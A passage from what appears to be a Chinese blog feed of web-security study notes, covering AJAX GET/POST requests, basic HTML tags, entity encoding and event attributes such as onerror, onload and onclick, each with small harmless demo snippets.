title="请求实现-POST请求"></a>请求实现-POST请求</h3><p>（1）一个简单的POST请求：</p><pre><code>xmlhttp.open(&quot;POST&quot;,&quot;demo_post.asp&quot;,true);xmlhttp.send();</code></pre><p>（2）若需要像HTML表单那样POST数据，可以使用setRequestHeader()来添加HTTP头。然后在send()方法中规定想要发送的数据：</p><pre><code>xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);</code></pre><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>setRequestHeader(header,value)</td><td>向请求添加HTTP头                                                                                                           (1)header：规定头的名称                                                                                          (2)value：规定头的值</td></tr></tbody></table><p>（3）AJAX请求代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;    function loadXMLDoc()&#123;        var xmlhttp;        if (window.XMLHttpRequest)&#123;            xmlhttp=new XMLHttpRequest();        &#125;        else&#123;            xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);        &#125;        xmlhttp.onreadystatechange=function()&#123;            if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;                document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;            &#125;        &#125;        xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true);        xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);        xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);    &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;AJAX&lt;/h2&gt;    &lt;button type=&quot;button&quot; onclick=&quot;loadXMLDoc()&quot;&gt;请求数据&lt;/button&gt;    &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>扩展：</p><h2 id="AJAX的GET请求"><a href="#AJAX的GET请求" class="headerlink" title="AJAX的GET请求"></a>AJAX的GET请求</h2><pre><code class="javascript">function ajax1()&#123;    //1.创建一个XMLHttpRequest对象    //打开浏览器    var xmlhttp = new XMLHttpRequest()    //2.使用open方法，表明请求的方式    //在浏览器上输入请求的URL        //1.GET/POST        //2.page        //3.true 异步    xmlhttp.open(&quot;GET&quot;,&quot;./AJAX_Back.html&quot;,true)    //3.使用send方法，发送请求的数据    //敲下回车，发送数据    xmlhttp.send()    //4.判断ajax是否从请求的页面中收到了数据    //当网页给响应时，将响应显示在页面上    xmlhttp.onload=function()&#123;        //xmlhttp.responeseText用于获取ajax接收到的响应        document.querySelectorAll(&quot;.container&quot;)[0].innerHTML=xmlhttp.responseText    &#125;&#125;</code></pre><h2 id="AJAX的POST请求"><a href="#AJAX的POST请求" class="headerlink" title="AJAX的POST请求"></a>AJAX的POST请求</h2><p>post请求特征：</p><ul><li>post请求Header部分一定会存在一个字段Content-Type，用于判断post提交数据的类型</li><li>如果post请求提交的是一串数据，则Content-Type: application/x-www-form-urlencoded</li></ul><pre><code class="javascript">function ajax1()&#123;    //1.创建一个XMLHttpRequest对象    //打开浏览器    var xmlhttp = new XMLHttpRequest()    //2.使用open方法，表明请求的方式    //在浏览器上输入请求的URL        //1.GET/POST        //2.page        //3.true    xmlhttp.open(&quot;POST&quot;,&quot;./AJAX_Back.html&quot;,true)    //3.使用setRequestHeader方法，设置请求头，表示需要提交数据    xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;)    //3.使用send方法，发送请求的数据.POSTData表示需要发送的数据    //敲下回车，发送数据    xmlhttp.send(&quot;POSTData&quot;)    //4.判断ajax是否从请求的页面中收到了数据    //当网页给响应时，将响应显示在页面上    xmlhttp.onload=function()&#123;        //xmlhttp.responeseText用于获取ajax接收到的响应        document.querySelectorAll(&quot;.container&quot;)[0].innerHTML=xmlhttp.responseText    &#125;&#125;</code></pre><h2 id="AJAX请求数据库"><a href="#AJAX请求数据库" class="headerlink" title="AJAX请求数据库"></a>AJAX请求数据库</h2><p>浏览器触发AJAX请求–&gt;使用AJAX请求对后端HTML(PHP)页面进行请求–&gt;使用PHP语句向MySQL数据库进行请求–&gt;MySQL将数据响应给PHP页面–&gt;PHP页面将数据响应给前端AJAX请求的页面–&gt;AJAX将得到的请求显示在浏览器上。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML代码进阶</title>
      <link href="2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/"/>
      <url>2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="网站前端架构介绍"><a href="#网站前端架构介绍" class="headerlink" title="网站前端架构介绍"></a>网站前端架构介绍</h2><h3 id="WEB应用的基本架构"><a href="#WEB应用的基本架构" class="headerlink" title="WEB应用的基本架构"></a>WEB应用的基本架构</h3><p><img src="https://i.loli.net/2021/03/15/52cAsmaUxB4gwnF.png" alt="image-20210315145057858"></p><h3 id="从网页制作到前端开发"><a href="#从网页制作到前端开发" class="headerlink" title="从网页制作到前端开发"></a>从网页制作到前端开发</h3><p>（1）WEB1.0时代的产物是“网页制作”，这时候的网页主要是静态网页，即没有与用户进行交互，而仅仅供读者浏览的网页，例如一篇日志、博文等展示性文章。（缺乏交互性）</p><p>（2）WEB2.0时代，网页有静态网页和动态网页。</p><ul><li>所谓动态网页，就是用户不仅可以浏览网页，还可以与服务器进行交互。例如用户登录某个网站，输入账号密码，由服务器对该用户的账号进行验证，通过验证即可成功登录。</li><li>WEB2.0时代的网页不仅包含绚丽的动画、音频和视频，还可以让用户在网页中进行评论交流、上传和下载文件等。具有良好的交互性。因而不再叫做“网页制作”，而是叫“WEB前端开发”。</li></ul><h3 id="前端网站搭建所需环境"><a href="#前端网站搭建所需环境" class="headerlink" title="前端网站搭建所需环境"></a>前端网站搭建所需环境</h3><p>（1）Web服务程序：Apache或IIS</p><p>（2）数据库服务程序：mysql或mssql</p><p>（3）操作脚本引擎：PHP或JSP</p><h3 id="前端架构核心技术"><a href="#前端架构核心技术" class="headerlink" title="前端架构核心技术"></a>前端架构核心技术</h3><p>（1）网页最主要由3部分组成：结构、表现和行为，目前模式是HTML、CSS和JavaScript。</p><p>（2）HTML是网页的结构，便于浏览器进行解析。CSS是网页的外观，使HTML文档更美观。而JavaScript是页面的行为赋予网站一些特定的动作，如放大或缩小图片。</p><p>（3）CSS（Cascading Style Sheets）,用来表现HTML文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><p>（4）HTML文档中可以嵌入css和JavaScript，也可以将css和JavaScript单独下载css或js文件中，然后引入HTML文档中。</p><h2 id="HTML基本语法"><a href="#HTML基本语法" class="headerlink" title="HTML基本语法"></a>HTML基本语法</h2><h3 id="代码编写编辑器"><a href="#代码编写编辑器" class="headerlink" title="代码编写编辑器"></a>代码编写编辑器</h3><p>（1）离线编辑器：pycharm、Sublime Text3、Notepad++、vsCode</p><p>（2）在线编辑器：</p><ul><li><a href="https://www.jq22.com/webide/">https://www.jq22.com/webide/</a></li><li><a href="https://www.w3school.com.cn/tiy/t.asp">https://www.w3school.com.cn/tiy/t.asp</a></li><li><a href="https://c.runoob.com/front-end/61">https://c.runoob.com/front-end/61</a></li></ul><p>（3）VScode快捷键：Ctrl+/  注释、Tab   补全、Alt+B  运行。</p><h3 id="HTML基本概念"><a href="#HTML基本概念" class="headerlink" title="HTML基本概念"></a>HTML基本概念</h3><p>（1）HTML指的是超文本标记语言(Hyper Text Markup Language)</p><p>（2）HTML不是一种编程语言，而是一种标记语言(Markup Language)，标记语言是一套标记标签(Markup Tag)</p><p>（3）HTML使用标记标签来描述网页</p><p>（4）HTML标签是由尖括号包围的关键词，比如&lt;html&gt;</p><p>（5）<strong>HTML标签通常是成对出现的</strong>，比如&lt;b&gt;和&lt;/b&gt;</p><p>（6）<strong>标签对中第一个标签是开始标签，第二个标签是结束标签</strong></p><p>（7）开始标签和结束标签也被称为开放标签和闭合标签</p><p>（8）<strong>编写HTML时，不会出现报错信息，并且具有自动纠错功能。</strong></p><p>PS:<strong>HTML文档通常用htm和html作为后缀名。Web浏览器的作用是读取HTML文档，并以网页的形式显示出他们。浏览器不会显示HTML标签，而是使用标签来解释页面的内容。</strong></p><h3 id="HTML元素"><a href="#HTML元素" class="headerlink" title="HTML元素"></a>HTML元素</h3><p>（1）HTML元素指的是从开始标签(start tag)，到结束标签(end tag)的所有代码。</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;a href=&quot;index.html&quot;&gt;首页&lt;/a&gt;        &lt;br&gt;    &lt;/body&gt;&lt;/html&gt;&lt;!-- 上述HTML代码中，html元素中嵌套了body元素，body元素中又嵌套了a元素和br元素 --&gt;</code></pre><p><img src="https://i.loli.net/2020/12/16/ahLjpODg9TUnw6I.png" alt="image-20201216201051807"></p><p>（2）HTML元素语法</p><ul><li><p>HTML元素以开始标签(start tag)起始，以结束标签(end tag)终止</p></li><li><p>元素的内容是开始标签与结束标签之间的内容</p></li><li><p>某些HTML元素内容为空，空元素在开始标签中闭合，无结束标签</p></li><li><p>大多数HTML元素可拥有属性，属性总是以名称/值对的形式出现，提供了有关HTML元素的更多信息。</p><p>属性总是在HTML元素的开始标签中规定；属性值应该始终被包括在引号内，双引号是最常用的，不过使用单引号也没问题。</p></li></ul><p>（3）嵌套的HTML元素</p><ul><li>大多数HTML元素可以嵌套(可以包含其他HTML元素)</li><li>HTML文档由嵌套的HTML元素构成</li></ul><p>（4）空的HTML元素</p><ul><li>没有内容的HTML元素被称为空元素。空元素是在开始标签中关闭的。</li><li>&lt;br /&gt;就是没有关闭标签的空元素(&lt;br /&gt;标签定义换行)</li></ul><h3 id="常见的HTML标签"><a href="#常见的HTML标签" class="headerlink" title="常见的HTML标签"></a>常见的HTML标签</h3><p>行标签、块标签、行列块标签</p><p>（1）基础标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;!DOCTYPE&gt;</td><td align="center">定义文档类型</td></tr><tr><td align="center">&lt;html&gt;</td><td align="center">定义HTML文档</td></tr><tr><td align="center">&lt;body&gt;</td><td align="center">定义文档的主体</td></tr><tr><td align="center">&lt;head&gt;</td><td align="center">定义关于文档的信息，默认换行</td></tr><tr><td align="center">&lt;meta&gt;</td><td align="center">定义关于HTML文档的元信息</td></tr><tr><td align="center">&lt;title&gt;</td><td align="center">定义文档的题目</td></tr><tr><td align="center">&lt;script&gt;</td><td align="center">定义客户端脚本，元素内容编写js代码</td></tr><tr><td align="center">&lt;style&gt;</td><td align="center">元素内容编写css代码</td></tr></tbody></table><p>（2）多媒体标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;img&gt;</strong></td><td align="center"><strong>定义图像</strong></td></tr><tr><td align="center">&lt;audio&gt;</td><td align="center">定义声音内容</td></tr><tr><td align="center">&lt;video&gt;</td><td align="center">定义视频</td></tr></tbody></table><pre><code class="html">&lt;img src=&quot;&quot;  alt=&quot;&quot;&gt;test&lt;/img&gt;&lt;audio src=&quot;&quot; controls&gt;&lt;/audio&gt;&lt;video src=&quot;&quot; controls&gt;&lt;/video&gt;&lt;!-- src和href表示资源路径，如果无法显示图片，浏览器将显示代替文本，即alt的值。controls代表显示控件，可以让用户手动播放音频和视频--&gt;</code></pre><p>（3）表单标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;form&gt;</strong></td><td align="center"><strong>定义供用户输入的HTML表单</strong></td></tr><tr><td align="center"><strong>&lt;input&gt;</strong></td><td align="center"><strong>定义输入控件(一个输入框)</strong></td></tr><tr><td align="center"><strong>&lt;textarea&gt;</strong></td><td align="center">定义多行的文本输入控件(一个大的多行输入框)</td></tr><tr><td align="center"><strong>&lt;button&gt;</strong></td><td align="center">定义按钮</td></tr><tr><td align="center"><strong>&lt;select&gt;</strong></td><td align="center">定义选择列表(下拉列表)</td></tr><tr><td align="center"><strong>&lt;optgroup&gt;</strong></td><td align="center">定义选择列表中的相关选项的组合</td></tr><tr><td align="center"><strong>&lt;option&gt;</strong></td><td align="center">定义选择列表中的选项</td></tr><tr><td align="center">&lt;fieldset&gt;</td><td align="center">定义围绕表单中元素的边框</td></tr><tr><td align="center">&lt;datalist&gt;</td><td align="center">定义下拉列表</td></tr></tbody></table><pre><code class="html">&lt;html&gt;    &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;/head&gt;&lt;form action=&quot;1.php&quot; method=&quot;GET&quot;&gt;     &lt;h1&gt;个人信息填写&lt;/h1&gt;    &lt;!-- action表示将表单提交到哪里，method表示提交的方法(GET或POST)--&gt;    性别：    &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;男    &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;女    &lt;!-- input定义一个输入框，根据type值的不同有不同的输入方式和内容。常用的type的值有：number(数字)text(文本)、date(日期)、email(邮件)、password(密码)、radio(单选框)、checkbox(复选框)。当参数名称name的值相同时，单选框只能选择一个，提交表单时提交value对应的值。--&gt;    &lt;br/&gt;    爱好：    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;运动    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;漫画    &lt;input type=&quot;checkbox&quot; name=&quot;&quot; value=&quot;&quot;&gt;游戏    &lt;br/&gt;    城市：    &lt;!-- 下拉框--&gt;    &lt;select name=&quot;&quot; id=&quot;&quot;&gt;        &lt;optgroup&gt;            &lt;option value=&quot;厦门&quot;&gt;厦门&lt;/option&gt;            &lt;option value=&quot;福州&quot;&gt;福州&lt;/option&gt;            &lt;option value=&quot;泉州&quot;&gt;泉州&lt;/option&gt;        &lt;/optgroup&gt;        &lt;br/&gt;        &lt;optgroup&gt;            &lt;option value=&quot;成都&quot;&gt;成都&lt;/option&gt;        &lt;/optgroup&gt;    &lt;/select&gt;    &lt;br/&gt;    个人描述：    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;500&quot; sytle=&quot;resize:none;&quot;&gt;&lt;/textarea&gt;    &lt;!-- cols表示列数，rows表示行数，浏览器显示时可随意拉伸该文本框,resize:none;表示禁止拉伸--&gt;    &lt;br/&gt;    &lt;input type=&quot;submit&quot; /&gt; &lt;!--一般用于提交表单，而不是botton标签，button一般放在form标签外面--&gt;    &lt;input type=&quot;reset&quot; /&gt; &lt;!--重置表单的所有数据--&gt;&lt;/form&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/21/3S2o5Fri9BMVU7f.png" alt="image-20210321093128668"></p><p>（4）链接标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;a&gt;</strong></td><td align="center"><strong>定义超链接</strong></td></tr><tr><td align="center"><strong>&lt;link&gt;</strong></td><td align="center">定义文档与外部资源的关系</td></tr></tbody></table><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;demo.css&quot; target=&quot;_blank&quot;/&gt;&lt;!-- 在编写HTML代码时，可用用link标签引入css文件。href表示css文件的存放位置，URL。若HTML文件和css文件在同一个目录下，href值如上.target=&quot;_blank&quot;表示打开一个新窗口，值为_self为打开当前窗口 --&gt;</code></pre><p>（5）格式标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;h1&gt;to&lt;h6&gt;</strong></td><td align="center"><strong>定义HTML标题</strong></td></tr><tr><td align="center"><strong>&lt;p&gt;</strong></td><td align="center"><strong>定义段落,默认在前后存在换行</strong></td></tr><tr><td align="center"><strong>&lt;br&gt;</strong></td><td align="center"><strong>定义换行</strong></td></tr><tr><td align="center">&lt;hr&gt;</td><td align="center">定义水平线</td></tr><tr><td align="center">&lt;b&gt;</td><td align="center">定义粗体文本</td></tr><tr><td align="center">&lt;big&gt;</td><td align="center">定义大号文本</td></tr><tr><td align="center">&lt;em&gt;</td><td align="center">定义强调文本</td></tr><tr><td align="center">&lt;i&gt;</td><td align="center">定义斜体文本</td></tr><tr><td align="center">&lt;pre&gt;</td><td align="center">定义预格式文本</td></tr><tr><td align="center">&lt;small&gt;</td><td align="center">定义小号文本</td></tr><tr><td align="center">&lt;font&gt;</td><td align="center">定义文本的字体大小和颜色</td></tr></tbody></table><pre><code class="html">&lt;hr color=&quot;red&quot; width=&quot;500px&quot; align=&quot;left&quot;&gt;&lt;!-- 水平线宽度为500像素，向左居中--&gt;&lt;font color=&quot;red&quot; size=&quot;18px&quot;&gt;文本&lt;/font&gt;&lt;!-- px为像素单位--&gt;</code></pre><p>（6）样式/节标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>&lt;style&gt;</strong></td><td align="center"><strong>定义文档的样式信息</strong></td></tr><tr><td align="center"><strong>&lt;div&gt;</strong></td><td align="center"><strong>定义文档中的分隔区块</strong></td></tr><tr><td align="center">&lt;span&gt;</td><td align="center">定义文档中的节</td></tr></tbody></table><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;div class=&quot;&quot; style=&quot;&quot;&gt;  &lt;!-- div作为一个块级元素，默认会占满一整行因此有换行的效果，但严格意义上说并不是换行，可以通过width，height，float等属性修改块的大小使之没有换行效果。独立成块，看成是一个容器，可在其中添加文字、图片、超链接等--&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（7）表格标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;table&gt;</td><td align="center">定义表格</td></tr><tr><td align="center">&lt;caption&gt;</td><td align="center">定义表格标题</td></tr><tr><td align="center">&lt;th&gt;</td><td align="center">定义表格中的表头单元格</td></tr><tr><td align="center">&lt;td&gt;</td><td align="center">定义表格中的单元格（列）</td></tr><tr><td align="center">&lt;tr&gt;</td><td align="center">定义表格中的行</td></tr></tbody></table><p>tr：表示表格中的一行，特点：存在N个tr，则会在表格中出现N行</p><p>td：表示一行中的一个单元格，特点：存在N个td，则会在该行中出现N个单元格</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;50&quot; border-collapse:collapse&gt; &lt;!-- border表示设置边框的宽度，cellspacing表示外边距,为0则隐藏了外边距但还存在。cellpadding设置表格的内边距。border-collapse：属性，为表格设置合并边框模型。其属性值如下：separate：默认值。边框会被分开。collapse：将边框会合并为一个单线的边框--&gt;            &lt;!--创建一个5行5列的表格,存在5个tr，25个td--&gt;           &lt;caption&gt;Security&lt;/caption&gt; &lt;!--表格标题，在表格的上方居中显示--&gt;            &lt;tr&gt;               &lt;th&gt;test1&lt;/th&gt;      &lt;!-- th表示表头单元格,有加粗--&gt;               &lt;th&gt;test2&lt;/th&gt;               &lt;th&gt;test3&lt;/th&gt;               &lt;th&gt;test4&lt;/th&gt;               &lt;th&gt;test5&lt;/th&gt;           &lt;/tr&gt;            &lt;tr&gt;               &lt;td&gt;1&lt;/td&gt;               &lt;td&gt;1&lt;/td&gt;               &lt;td&gt;1&lt;/td&gt;               &lt;td&gt;1&lt;/td&gt;               &lt;td&gt;1&lt;/td&gt;           &lt;/tr&gt;         &lt;/tabel&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（8）框架标签</p><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;frame&gt;</td><td align="center">定义框架集的窗口或框架</td></tr><tr><td align="center">&lt;frameset&gt;</td><td align="center">定义框架集</td></tr><tr><td align="center"><strong>&lt;iframe&gt;</strong></td><td align="center"><strong>定义内联框架</strong></td></tr></tbody></table><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;style&gt;            iframe&#123;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;iframe src=&quot;&quot; frameborder=&quot;0&quot; width=&quot;1000px&quot;  height=&quot;100%&quot;&gt;              &lt;!--iframe 内联框架，块级元素，有宽度和高度,可以在当前网页内引入另一个网页的资源,可加载并显示其他网页的内容,frameborder=0表示关闭边框，为1显示边框。高度和宽度值设置为100%表示占满全屏 --&gt;        &lt;/iframe&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>参考链接:<a href="https://www.w3school.com.cn/tags/index.asp">https://www.w3school.com.cn/tags/index.asp</a></p><h3 id="HTML注释"><a href="#HTML注释" class="headerlink" title="HTML注释"></a>HTML注释</h3><p>（1）注释标签&lt;!– 与 –&gt; 用于在HTML插入注释</p><pre><code class="html">&lt;!-- 在此处写注释 --&gt;</code></pre><p>（2）注释：在开始标签中有一个惊叹号，但是结束标签中没有。</p><p>（3）浏览器不会显示注释，但是能够帮助记录HTML文档。</p><p>（4）可以利用注释在HTML中放置通知和提醒信息。</p><h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>（1）HTML实体编码，也即HTML中的转义字符</p><ul><li>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。</li><li>如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。</li><li>字符实体类似：&entity_name;或者&#entity_number;</li></ul><p>（2）如需显示小于号，我们必须这样写：&amp;lt; 或 &amp;#60;</p><p>（3）使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。</p><p>（4）常见的实体编码，参考链接：<a href="https://www.w3school.com.cn/html/html_entities.asp">https://www.w3school.com.cn/html/html_entities.asp</a></p><table><thead><tr><th align="left">显示结果</th><th align="left">描述</th><th align="left">实体名称</th><th align="left">实体编号</th></tr></thead><tbody><tr><td align="left"></td><td align="left">空格</td><td align="left">&amp;nbsp;</td><td align="left">&amp;#160;</td></tr><tr><td align="left">&lt;</td><td align="left">小于号</td><td align="left">&amp;lt;</td><td align="left">&amp;#60;</td></tr><tr><td align="left">&gt;</td><td align="left">大于号</td><td align="left">&amp;gt;</td><td align="left">&amp;#62;</td></tr><tr><td align="left">&amp;</td><td align="left">和号</td><td align="left">&amp;amp;</td><td align="left">&amp;#38;</td></tr><tr><td align="left">“</td><td align="left">引号</td><td align="left">&amp;quot;</td><td align="left">&amp;#34;</td></tr><tr><td align="left">‘</td><td align="left">撇号</td><td align="left">&amp;apos; (IE不支持)</td><td align="left">&amp;#39;</td></tr><tr><td align="left">©</td><td align="left">版权（copyright）</td><td align="left">&amp;copy;</td><td align="left">&amp;#169;</td></tr></tbody></table><p>（5）HTML属性–全局属性</p><p>全局属性是可用于为任何HTML元素赋予意义和语境的属性。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">class</td><td align="center">规定元素的一个或多个类名(引用样式表中的类)</td></tr><tr><td align="center">hidden</td><td align="center">规定元素进行隐藏</td></tr><tr><td align="center">id</td><td align="center">规定元素的唯一id</td></tr><tr><td align="center">style</td><td align="center">规定元素的行内CSS样式</td></tr><tr><td align="center">title</td><td align="center">规定有关元素的额外信息</td></tr><tr><td align="center">data-*</td><td align="center">路由。用于存储页面或应用程序的私有定制数据</td></tr></tbody></table><p>ps：id、class方便使用css和JavaScript控制对应的元素，id是唯一的，class是对应一个类</p><h2 id="HTML事件属性"><a href="#HTML事件属性" class="headerlink" title="HTML事件属性"></a>HTML事件属性</h2><p>（1）事件型属性是可以使HTML事件触发浏览器中的行为，比方说当用户点击某个HTML元素时启动一段JavaScript。</p><p>（2）事件型属性通常可以分为：全局事件属性，窗口事件属性，表单事件属性，键盘事件属性，鼠标事件属性，多媒体事件属性，其他事件属性。</p><h3 id="Window事件属性—onerror事件"><a href="#Window事件属性—onerror事件" class="headerlink" title="Window事件属性—onerror事件"></a>Window事件属性—onerror事件</h3><p>（1）onerror：在错误发生时运行的脚本。</p><p>（2）定义和用法：</p><ul><li>onerror事件会在文档或图像加载过程中发生错误时被触发。</li><li>在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。</li></ul><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;!-- onerror 事件会在文档或图像加载过程中发生错误时被触发。--&gt;        &lt;img src=&quot;image.gif&quot;             onerror=&quot;alert(&#39;The image could not be loaded.&#39;)&quot; /&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/EOgsuHUzaYPecBd.png" alt="image-20210315165838173"></p><h3 id="Window事件属性—onload事件"><a href="#Window事件属性—onload事件" class="headerlink" title="Window事件属性—onload事件"></a>Window事件属性—onload事件</h3><p>（1）onload：页面结束加载之后触发。</p><p>（2）定义和用法：</p><ul><li>onload属性在对象已加载时触发。</li><li>onload常用在&lt;body&gt;中，一旦完全加载所有内容(包括图像、脚本文件、CSS文件等)，就执行一段脚本。</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body onload=&quot;alert(&#39;该页面已加载！&#39;)&quot;&gt;        &lt;h1&gt;            Hello World!        &lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/86aqodCfvhipGBl.png" alt="image-20210315180956314"></p><h3 id="Form事件属性—onchange事件"><a href="#Form事件属性—onchange事件" class="headerlink" title="Form事件属性—onchange事件"></a>Form事件属性—onchange事件</h3><p>（1）onchange：在元素值被改变时运行的脚本。</p><p>（2）定义和用法：</p><ul><li>onchange事件会在域的内容改变时发生。</li><li>onchange事件也可用于单选框与复选框改变后触发的事件</li><li>onchange属性适用于：&lt;input&gt;、&lt;textarea&gt;以及&lt;select&gt;元素。</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function myFunction()&#123;                var x=document.getElementById(&quot;fname&quot;);                x.value=x.value.toUpperCase();            &#125;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        输入你的名字：&lt;input type=&quot;text&quot; id=&quot;fname&quot; onchange=&quot;myFunction()&quot;&gt;        &lt;!--当你离开输入框后，函数将被触发，将小写字母转变为大写字母--&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/nmSdzCarPgTRs1q.png" alt="image-20210315181941724"></p><p><img src="https://i.loli.net/2021/03/15/2olfHGX8RTmL3wS.png" alt="image-20210315181959113"></p><h3 id="Form事件属性—onfocus事件"><a href="#Form事件属性—onfocus事件" class="headerlink" title="Form事件属性—onfocus事件"></a>Form事件属性—onfocus事件</h3><p>（1）onfocus：当元素获得焦点时运行的脚本。</p><p>（2）定义和用法：</p><ul><li>onfocus属性在元素获得焦点时触发</li><li>onfocus常用于&lt;input&gt;、&lt;select&gt;以及&lt;a&gt;</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function myFunction(x)&#123;                x.style.background=&quot;yellow&quot;;            &#125;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        输入你的名字：&lt;input type=&quot;text&quot; onfocus=&quot;myFunction(this)&quot;&gt;        &lt;!--当输入框获取焦点时，修改背景色将被触发--&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/1G263yPbEOo8qfe.png" alt="image-20210315182624985"></p><p><img src="https://i.loli.net/2021/03/15/vk34qrVUO8FSlwB.png" alt="image-20210315182637474"></p><h3 id="Mouse事件属性—onclick事件"><a href="#Mouse事件属性—onclick事件" class="headerlink" title="Mouse事件属性—onclick事件"></a>Mouse事件属性—onclick事件</h3><p>onclick：元素上发生鼠标点击时触发。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function myFunction()&#123;                document.getElementById(&quot;demo&quot;).innerHTML=&quot;Hello World&quot;;            &#125;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;button onclick=&quot;myFunction()&quot;&gt;            点我        &lt;/button&gt;        &lt;p id=&quot;demo&quot;&gt;        &lt;/p&gt;        &lt;!-- 点击将触发onclick事件 --&gt;        &lt;button onclick=&quot;window.location.href=&#39;http:\/\/127.0.0.1&#39;&quot;&gt;            填写个人信息        &lt;/button&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/OsY4WdJU2cRVurM.png" alt="image-20210315184435547"></p><h3 id="Mouse事件属性—onmousemove事件"><a href="#Mouse事件属性—onmousemove事件" class="headerlink" title="Mouse事件属性—onmousemove事件"></a>Mouse事件属性—onmousemove事件</h3><p>onmouseover：当鼠标指针移动到元素时触发</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;input onmousemove=&quot;alert(&#39;The event has been triggered&#39;)&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/4iME3hV2CygcuX1.png" alt="image-20210315185221847"></p><h3 id="Mouse事件属性—onmouseover事件"><a href="#Mouse事件属性—onmouseover事件" 